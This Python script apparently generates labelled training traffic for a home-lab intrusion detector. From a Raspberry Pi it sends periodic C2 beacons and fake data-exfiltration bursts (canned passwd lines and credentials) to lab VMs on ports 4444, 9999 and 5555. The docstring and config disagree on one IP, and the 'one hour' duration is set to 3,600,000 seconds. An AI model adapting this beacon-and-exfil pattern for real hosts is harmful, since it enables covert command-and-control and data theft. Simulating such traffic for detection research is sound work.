#!/usr/bin/env python3
"""
backdoor_pi.py — Run on Raspberry Pi (192.168.1.215)
Simulates backdoor C2 traffic by sending data to all 3 VM endpoints.

Targets:
  VM1 (192.168.1.151): reverse shell handler (port 4444)
  VM2 (192.168.1.156): data exfiltration receiver (port 9999)
  VM3 (192.168.1.170): secondary C2 (port 5555)

Label: Backdoor (captured by extractor in backdoor mode)
"""

import socket
import threading
import time
import random
import os

# ── Config ────────────────────────────────────────────────────────────────────
C2_ENDPOINTS = [
    {"ip": "192.168.1.150", "port": 4444,  "role": "reverse_shell"},
    {"ip": "192.168.1.156", "port": 9999,  "role": "exfil_receiver"},
    {"ip": "192.168.1.170", "port": 5555,  "role": "secondary_c2"},
]

DURATION         = 3600000   # 1 hour
BEACON_INTERVAL  = 10      # seconds between beacons per endpoint
EXFIL_INTERVAL   = 10      # seconds between exfil bursts

# Simulated exfiltration payloads
EXFIL_PAYLOADS = [
    b"/etc/passwd contents: root:x:0:0:root:/root:/bin/bash\n",
    b"/etc/hosts: 127.0.0.1 localhost\n192.168.1.215 iot-gateway\n",
    b"sensor_data: temp=22.7,hum=39.7,device=192.168.1.116\n",
    b"network_info: wlan0 192.168.1.215/24 UP\n",
    b"process_list: python3 flask influxd grafana\n",
    b"credentials: admin:admin123 user:password\n",
]

stop_event = threading.Event()


def beacon(endpoint):
    """Send periodic heartbeat to C2 endpoint."""
    ip   = endpoint["ip"]
    port = endpoint["port"]
    role = endpoint["role"]

    end_time = time.time() + DURATION
    count    = 0

    while time.time() < end_time and not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))

            # Send beacon with small random payload
            payload = f"BEACON|{role}|{count}|{time.time():.0f}\n".encode()
            s.send(payload)

            # Try to receive response (C2 command)
            try:
                response = s.recv(1024)
                if response:
                    print(f"[{role}] Received cmd: {response[:50]}")
            except:
                pass

            s.close()
            count += 1
            print(f"[{role}] Beacon {count} → {ip}:{port}")

        except Exception as e:
            print(f"[{role}] Connection failed: {e}")

        time.sleep(BEACON_INTERVAL + random.uniform(-0.5, 0.5))


def exfiltrate(endpoint):
    """Send bursts of exfiltrated data to receiver endpoint."""
    ip   = endpoint["ip"]
    port = endpoint["port"]
    role = endpoint["role"]

    end_time = time.time() + DURATION
    burst    = 0

    while time.time() < end_time and not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))

            # Send multiple payloads in one session (exfil burst)
            burst += 1
            for payload in random.sample(EXFIL_PAYLOADS,
                                          len(EXFIL_PAYLOADS)):
                s.send(payload)
                time.sleep(0.1)

            s.close()
            print(f"[{role}] Exfil burst {burst} → {ip}:{port} "
                  f"({len(EXFIL_PAYLOADS)} payloads)")

        except Exception as e:
            print(f"[{role}] Exfil failed: {e}")

        time.sleep(EXFIL_INTERVAL + random.uniform(-0.5, 0.5))


def main():
    print("=" * 60)
    print("Backdoor C2 Communication — Raspberry Pi")
    print("=" * 60)
    print(f"Duration: {DURATION}s ({DURATION//60} min)")
    print(f"Endpoints:")
    for ep in C2_ENDPOINTS:
        print(f"  {ep['ip']}:{ep['port']} ({ep['role']})")
    print()
    print("Extractor mode: sudo python3 network_extractor.py backdoor")
    print()

    threads = []

    # Start beacon thread for each endpoint
    for ep in C2_ENDPOINTS:
        if ep["role"] == "exfil_receiver":
            t = threading.Thread(target=exfiltrate, args=(ep,), daemon=True)
        else:
            t = threading.Thread(target=beacon, args=(ep,), daemon=True)
        threads.append(t)
        t.start()
        print(f"[*] Started {ep['role']} thread → {ep['ip']}:{ep['port']}")

    print()
    print(f"[*] Running for {DURATION}s — Ctrl+C to stop")

    try:
        time.sleep(DURATION)
    except KeyboardInterrupt:
        print("\n[*] Stopping...")

    stop_event.set()
    print("[*] Done")


if __name__ == "__main__":
    main()